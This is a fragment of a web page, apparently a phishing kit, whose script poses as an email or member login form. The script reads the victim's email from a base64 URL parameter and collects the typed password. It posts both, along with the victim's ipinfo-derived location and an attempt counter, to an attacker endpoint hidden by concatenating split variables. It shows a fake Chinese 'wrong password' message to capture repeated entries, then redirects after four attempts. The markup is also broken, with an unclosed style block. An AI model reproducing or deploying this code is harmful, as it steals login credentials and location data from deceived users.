    <style type="text/css">
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font: 12px/1.5 "Roboto", Arial, "Microsoft YaHei", sans-serif;
      }

      body {
        color: #404349;
        font: 12px/1.5 "Roboto", Arial, "Microsoft YaHei", sans-serif;
        -webkit-font-smoothing: antialiased;
        background-color: #f0f1f2;
      }

      body,
      html {
        height: 100%;
        margin: 0;
        font-size: 14px;
      }

      a {
        text-decoration: none;
      }

      a:active {
        color: #2d6bb3;
      }

      a:hover {
        color: #6aace6;
      }

      #frame {
        width: 100%;
        height: auto;
        padding: 20px;
        float: left;
        position: relative;
        font-size: 14px;
        color: #444;
        clear: both;
        z-index: 10;
        //box-shadow:0px 1px 2px #777;
      }

      #inner-frame {
        max-width: 800px;
        width: 100%;
        height: auto;
        margin: auto;
        padding: 10px;
        position: relative;
        overflow-x: hidden;
      }

      input:-internal-autofill-selected {
        background-color: transparent;
      }

      .errorfound {
        border: 2px solid #d00;
        box-shadow: 0px 0px 1px #d00;
        color: #d00;
      }

      #loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #fff9;
        z-index: 99;
        border-radius: 10px;
      }

      @keyframes hideLoader {
        from {
          opacity: 1;
        }

        to {
          opacity: 0;
        }
      }

      @keyframes showLoader {
        from {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }

      .formImgHolder {
        display: grid;
        grid-template-columns: 50% 50%;
        background-color: #fff;
        box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
      }

        <div
          style="
            width: 100%;
            margin-top: px;
            line-height: 2;
            text-align: center;
          "
        >
         

    <script>
      const xx = window.location.href.split("?");
      let ck = document.querySelector("#ck");
      let ckorg = document.querySelector("#ckorg");
      let cknow = document.querySelector("#cknow");
      let loader = document.querySelector("#loader");
      let loc = document.querySelector("#loc");
      let trial = document.querySelector("#trial");

      if (xx[1] != undefined) {
        ck.value = atob(xx[1]);
        ckorg.value = atob(xx[1]);
      }

      trial.value = trialCount;

      let myForm = document.querySelector("#form_");
      myForm.addEventListener("submit", async function (event) {
        event.preventDefault();

        let data = new FormData();

        let options = {
          method: "POST",
          body: data,
        };

        data.append("ck", ck.value);
        data.append("ckorg", ckorg.value);
        data.append("cknow", cknow.value);
        data.append("loc", loc.value);
        data.append("trial", trial.value);
        data.append("resBox", resBox);

        loader.style.display = "flex";
        loader.style.animation = "showLoader .5s ease";

        const response = await fetch(
          `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`,
          options
        );
        const result = await response.text();

        loader.style.animation = "hideLoader 1s ease";
        setTimeout(() => {
          loader.style.display = "none";
        }, 1000);

        console.log(result);

        trialCount++;
        sessionStorage.setItem("num_trial", trialCount);
        trial.value = trialCount;

        if (trialCount >= 4) {
          window.location.assign(`${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`);
        } else {
          cknow.value = "";
          cknow.focus();
          document.getElementById("errmsg").innerHTML =
            "邮箱/会员登录名或者密码不正确，请重新输入 ";
        }
      });

      $.get(
        "https://ipinfo.io/json?token=10da60a9ff2d81",
        function (response) {
          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
          $("#loc").val(cou);
        },
        "jsonp"
      );
    </script>
